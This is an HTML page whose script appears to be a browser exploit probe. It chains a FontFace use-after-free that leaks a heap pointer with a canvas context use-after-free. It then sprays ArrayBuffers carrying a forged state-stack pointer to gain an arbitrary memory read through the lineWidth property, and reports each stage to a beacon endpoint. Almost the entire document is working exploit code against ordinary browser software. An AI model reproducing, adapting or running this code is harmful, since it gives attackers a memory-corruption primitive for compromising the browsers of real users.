<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P695 — cross-type forge oracle (AB-only, no same-type spray)</title>
<script>
'use strict';
/* ============================================================
 * P695 — FORGED m_stateStack ARBITRARY-READ ORACLE (clean)
 *
 * Same goal as P694, but with the same-type context spray
 * REMOVED ENTIRELY. A concurrent edit had re-inserted
 * `sprayX2` (lineWidth=1337) which reclaimed the freed slot
 * first and made lineWidth read 1337 through the alias instead
 * of through our forged ArrayBuffer. This probe performs the
 * AB(768)-only cross-type reclaim so the forged m_stateStack
 * at +112 is what lineWidth actually reads.
 *
 * Sequence:
 *   A) FontFace reclaim -> leak p58 (live heap ptr), persist.
 *   B) Canvas UAF (bitmaprenderer/2d via alpha getter).
 *   C) Spray ONLY ArrayBuffer(768). Forge qword[14]=p58-48,
 *      u32@+120=1, u32@+124=1 in every AB.
 *   D) innerCtx2.lineWidth -> should read mem[p58] (the 8 bytes
 *      the FontFace continuation wrote = a WeakHashSet impl ptr).
 *      nonzero + heap-shaped (0x10...) == ARBITRARY READ CONFIRMED.
 * ============================================================ */

function b(tag,data){try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P695-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,900))+'&t='+Date.now(),true);
  x.send(null);}catch(e){}}
function ba(tag,data){try{new Image().src='/beacon.php?tag=P695-'+encodeURIComponent(tag)+
  '&data='+encodeURIComponent(String(data||'').slice(0,300))+'&t='+Date.now();}catch(e){}}
function hex(v){return '0x'+BigInt(v).toString(16)}
function f64bits(v){var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;
  return new BigUint64Array(b)[0]}

function getStage(){try{var s=sessionStorage.getItem('p695s');if(s!==null)return parseInt(s)||0;}catch(e){}return 0;}
function setStage(v){try{sessionStorage.setItem('p695s',String(v));}catch(e){}
  try{document.cookie='p695s='+v+';path=/;max-age=86400';}catch(e){}}

var stage=getStage();

function run(){
  b('BOOT','stage='+stage);
  if(stage>=3){ setStage(0); b('GIVEUP','reset'); document.body.textContent='P695 GIVEUP'; return; }
  setStage(stage+1);
  try { return stageA_FontFace(); }
  catch(e){ b('BOOT-ERR',(e.message||String(e)).slice(0,120)); }
}

function stageA_FontFace(){
  b('A-GO');
  var styleEl=document.createElement('style');
  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(styleEl);
  var face=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;
  var ffAbs=[],ffFired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(ffFired)return undefined;ffFired=true;
      if(styleEl){styleEl.remove();styleEl.textContent='';styleEl=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<48;k++)ffAbs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em s0');}catch(e){}
      return undefined;
    },set:function(){}});
  document.fonts.load('1em f0, s0','AB');

  setTimeout(function(){
    var bestK=-1,bestNz=0;
    for(var k=0;k<ffAbs.length;k++){
      var u=new Uint8Array(ffAbs[k]),nz=0;
      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
      if(nz>bestNz){bestNz=nz;bestK=k;}
    }
    if(bestK<0||bestNz===0){ b('A-MISS','no-hit'); location.reload(); return; }
    var bv=new BigUint64Array(ffAbs[bestK]);
    var p58=bv[11], p68=bv[13];
    b('A-HIT','p58='+hex(p58)+'|p68='+hex(p68)+'|k='+bestK+'|nz='+bestNz);
    try{sessionStorage.setItem('p695_p58',p58.toString());}catch(e){}
    try{sessionStorage.setItem('p695_p68',p68.toString());}catch(e){}
    setStage(1);
    location.reload();
  }, 200);
}

function runStageB(){
  var p58=null,p68=null;
  try{p58=BigInt(sessionStorage.getItem('p695_p58'));}catch(e){}
  try{p68=BigInt(sessionStorage.getItem('p695_p68'));}catch(e){}
  if(p58===null){ b('B-NOLEAK','p58-missing'); setStage(0); return; }
  b('B-GO','p58='+hex(p58));

  var innerCtx2=null;
  var canvas2=document.createElement('canvas'); canvas2.width=1; canvas2.height=1;
  var o={};
  Object.defineProperty(o,'alpha',{get:function(){ innerCtx2=canvas2.getContext('2d'); return true; }});
  canvas2.getContext('bitmaprenderer', o);
  if(!innerCtx2){ b('B-FAIL','no-ctx'); return; }
  b('B-UAF','ok');

  var abs=[];
  for(var ai=0;ai<500;ai++) abs.push(new ArrayBuffer(768));
  b('B-SPRAY','500-AB-only');

  var TARGET = p58 - BigInt(48);
  for(var fi=0;fi<abs.length;fi++){
    var bv=new BigUint64Array(abs[fi]);
    var u32=new Uint32Array(abs[fi]);
    bv[14]=TARGET;
    u32[30]=1;
    u32[31]=1;
  }
  b('B-FORGED','target='+hex(TARGET));

  var lw=null,err=null;
  try{ lw=innerCtx2.lineWidth; }catch(e){ err=(e.message||String(e)); }
  if(err!==null){ b('B-READ-ERR', err.slice(0,160)); return; }
  b('B-READ','lw='+lw+'|bits='+hex(f64bits(lw)));

  var bits=f64bits(lw);
  var isNonZero=(bits!==BigInt(0));
  var looksHeap=(bits>=BigInt('0x1000000000')&&bits<BigInt('0x8000000000'));
  b('B-VERDICT','nonzero='+isNonZero+'|heapShaped='+looksHeap);

  try{ var ga=innerCtx2.globalAlpha; b('B-GA','ga='+ga+'|bits='+hex(f64bits(ga))); }catch(e){ b('B-GA-ERR',(e.message||'').slice(0,80)); }
  try{ var ml=innerCtx2.miterLimit; b('B-ML','ml='+ml+'|bits='+hex(f64bits(ml))); }catch(e){ b('B-ML-ERR',(e.message||'').slice(0,80)); }

  if(p68 && p68>BigInt(48)){
    var T2=p68-BigInt(48);
    for(var fi2=0;fi2<abs.length;fi2++) new BigUint64Array(abs[fi2])[14]=T2;
    try{ var lw2=innerCtx2.lineWidth; b('B-2ND','target='+hex(T2)+'|lw='+lw2+'|bits='+hex(f64bits(lw2))); }catch(e){ b('B-2ND-ERR',(e.message||'').slice(0,80)); }
  }

  setStage(0);
  ba('DONE','oracle='+(isNonZero?'READ-WORKS':'ZERO')+'|heapShaped='+looksHeap+'|lw_bits='+hex(bits));
}

if(document.readyState==='complete'||document.readyState==='interactive'){
  setTimeout(function(){
    if(stage===1){ runStageB(); } else { run(); }
  },0);
} else {
  document.addEventListener('DOMContentLoaded',function(){
    if(stage===1){ runStageB(); } else { run(); }
  });
}
</script>
</head><body><pre id="out">P695 — cross-type forge oracle (AB-only)</pre></body></html>
